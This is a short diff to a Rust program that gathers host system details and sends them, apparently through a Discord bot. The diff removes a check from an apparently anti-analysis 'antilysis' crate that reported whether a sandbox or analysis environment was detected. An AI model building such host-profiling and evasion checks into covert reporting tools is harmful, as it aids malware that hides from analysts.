@@ -9,8 +9,6 @@ use serenity::{
 use std::env;
 use sysinfo::{System, SystemExt};
 
-use antilysis;
-
 mod consts;
 
 #[tokio::main]
@@ -33,10 +31,6 @@ async fn main() {
     sysinfo.push_str(&format!(
         "System host name:        {}\n",
         unwrap_string(sys.host_name())
-    ));
-    sysinfo.push_str(&format!(
-        "Flagged by antilysis:    {}\n",
-        if antilysis::detected() {"yes"} else {"no"}
     ));
 
     send(sysinfo).await.unwrap();
